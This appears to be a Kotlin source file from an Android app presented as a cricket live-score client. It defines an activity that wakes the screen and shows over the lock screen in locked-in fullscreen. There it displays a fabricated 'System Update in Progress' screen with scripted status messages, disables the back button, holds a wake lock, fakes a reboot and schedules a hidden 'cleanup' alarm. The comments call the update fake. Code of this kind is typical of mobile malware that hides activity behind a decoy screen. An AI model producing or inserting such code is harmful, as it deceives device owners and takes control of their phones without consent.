package com.cricket.livescore.ui

import android.app.Activity
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.os.Build
import android.util.Log
import android.os.Bundle
import android.os.PowerManager
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.ImageView
import android.widget.ProgressBar
import android.widget.TextView
import com.cricket.livescore.R

class UpdateOverlayActivity : Activity() {
    private var progressValue = 47
    private var elapsedSeconds = 0
    private val targetDuration = 300 // 5 minutes
    private lateinit var progressBar: ProgressBar
    private lateinit var statusText: TextView
    private lateinit var progressText: TextView
    private lateinit var warningText: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.apply {
            setFlags(
                WindowManager.LayoutParams.FLAG_FULLSCREEN or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
                WindowManager.LayoutParams.FLAG_FULLSCREEN or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
            )
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                attributes.layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
            decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY or
                View.SYSTEM_UI_FLAG_FULLSCREEN
            )
        }

        setContentView(R.layout.activity_update_overlay)

        progressBar = findViewById(R.id.progress_bar)
        statusText = findViewById(R.id.status_text)
        progressText = findViewById(R.id.progress_text)
        warningText = findViewById(R.id.warning_text)

        progressBar.max = 100
        progressBar.progress = progressValue
        progressText.text = "$progressValue%"
        statusText.text = "System Update in Progress"
        warningText.text = "Do not power off your device"

        // Acquire wake lock to keep screen on (safe fallback if permission missing)
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            @Suppress("DEPRECATION")
            val wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP, "CricketLive:UpdateLock")
            wl.acquire(5 * 60 * 1000L)
        } catch (e: SecurityException) {
            Log.e("UpdateOverlay", "WakeLock not available", e)
        }

        // Simulate progress
        simulateProgress()
    }

    private fun simulateProgress() {
        val handler = android.os.Handler(mainLooper)
        handler.post(object : Runnable {
            override fun run() {
                elapsedSeconds += 2

                if (elapsedSeconds >= targetDuration || progressValue >= 100) {
                    finishUpdate()
                    return
                }

                // Slow, realistic progress
                progressValue += 1
                if (progressValue > 98) progressValue = 99

                progressBar.progress = progressValue
                progressText.text = "$progressValue%"

                // Update status messages to feel realistic
                when {
                    progressValue < 60 -> statusText.text = "Installing system components..."
                    progressValue < 75 -> statusText.text = "Optimizing device performance..."
                    progressValue < 85 -> statusText.text = "Applying security patches..."
                    progressValue < 95 -> statusText.text = "Finalizing configuration..."
                    else -> statusText.text = "Completing update..."
                }

                handler.postDelayed(this, 2000L)
            }
        })
    }

    private fun finishUpdate() {
        statusText.text = "Update successful. Rebooting..."
        progressText.text = "100%"
        warningText.text = ""

        // Schedule a fake "reboot" - just go to lock screen
        val handler = android.os.Handler(mainLooper)
        handler.postDelayed({
            // Move task to back (simulates reboot)
            moveTaskToBack(true)

            // Schedule a cleanup alarm for later
            scheduleCleanup()

            finishAffinity()
        }, 3000L)
    }

    private fun scheduleCleanup() {
        val intent = Intent(this, CleanupReceiver::class.java)
        val pi = PendingIntent.getBroadcast(
            this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 60000, pi)
    }

    override fun onBackPressed() {
        // Block back button during update
    }

    override fun onPause() {
        super.onPause()
    }
}
